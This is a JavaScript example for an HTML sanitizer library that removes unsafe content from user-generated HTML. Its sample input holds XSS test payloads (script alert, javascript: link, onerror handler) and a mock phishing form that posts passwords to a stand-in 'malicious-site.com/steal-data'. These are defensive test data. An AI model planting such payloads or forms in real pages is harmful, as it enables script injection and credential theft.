/**
 * Example: HTML Sanitizer
 * 
 * This example demonstrates how to use the library to create a HTML sanitizer
 * that makes user-generated content safe for display.
 */

import { 
  HtmlAstTransform, 
  SanitizeHtmlOperation,
  SecureExternalLinksOperation,
  RemoveCommentsOperation,
  AddClassOperation,
  isElementNode
} from '../src/index.js';

// Sample user-generated HTML that might contain unsafe content
const userGeneratedHtml = `
<div>
  <h2>User Content</h2>
  <!-- This is a comment that will be removed -->
  <p>This is a paragraph with <strong>formatted text</strong>.</p>
  
  <!-- Potentially unsafe elements -->
  <script>alert('XSS Attack!');</script>
  <iframe src="https://malicious-site.com"></iframe>
  
  <!-- Links without proper security attributes -->
  <a href="https://example.com">External link</a>
  <a href="javascript:alert('XSS')">Malicious link</a>
  
  <!-- Image with onerror attribute -->
  <img src="image.jpg" onerror="alert('XSS');" alt="Image">
  
  <!-- Form that could be used for phishing -->
  <form action="https://malicious-site.com/steal-data">
    <input type="text" name="password" placeholder="Enter your password">
    <button type="submit">Submit</button>
  </form>
</div>
`;

async function main() {
  // Create a new transformer
  const transformer = new HtmlAstTransform();
  
  // Add operations for sanitizing HTML
  transformer.addTransformation(new RemoveCommentsOperation());
  transformer.addTransformation(new SanitizeHtmlOperation({
    // Add any custom unsafe elements or attributes
    unsafeElements: ['marquee', 'blink'],
    unsafeAttributes: ['data-unsafe']
  }));
  transformer.addTransformation(new SecureExternalLinksOperation([
    // Domains to be considered "internal" (not requiring security attributes)
    'example.org', 'mysite.com'
  ]));
  
  // Add custom styling to external links
  transformer.addTransformation(new AddClassOperation('external-link', 
    (node) => {
      return node.name === 'a' && 
             node.attributes.href && 
             node.attributes.href.match(/^https?:\/\//i) &&
             !node.attributes.href.includes('example.org') &&
             !node.attributes.href.includes('mysite.com');
    }
  ));
  
  console.log('Original HTML:');
  console.log(userGeneratedHtml);
  console.log('\n--------------------------\n');
  
  try {
    // Process the HTML
    const { ast } = await transformer.parse(userGeneratedHtml);
    const { ast: sanitizedAst } = await transformer.transform(ast);
    
    // Convert back to HTML
    const sanitizedHtml = transformer.toHtml(sanitizedAst, { pretty: true });
    
    console.log('Sanitized HTML:');
    console.log(sanitizedHtml);
    
    // Analyze what was removed
    const originalNodeCount = countNodes(ast);
    const sanitizedNodeCount = countNodes(sanitizedAst);
    
    console.log('\nSanitization Statistics:');
    console.log(`- Original node count: ${originalNodeCount}`);
    console.log(`- Sanitized node count: ${sanitizedNodeCount}`);
    console.log(`- Removed nodes: ${originalNodeCount - sanitizedNodeCount}`);
    
    // Store the sanitized AST for later use
    await transformer.store('sanitized-content', sanitizedAst);
    console.log('\nSanitized AST stored with ID: sanitized-content');
  } catch (error) {
    console.error('Error sanitizing HTML:', error);
  }
}

// Helper function to count nodes in an AST
function countNodes(node) {
  let count = 1; // Count current node
  
  if (node.children) {
    for (const child of node.children) {
      count += countNodes(child);
    }
  }
  
  return count;
}

// Run the example
main().catch(console.error);
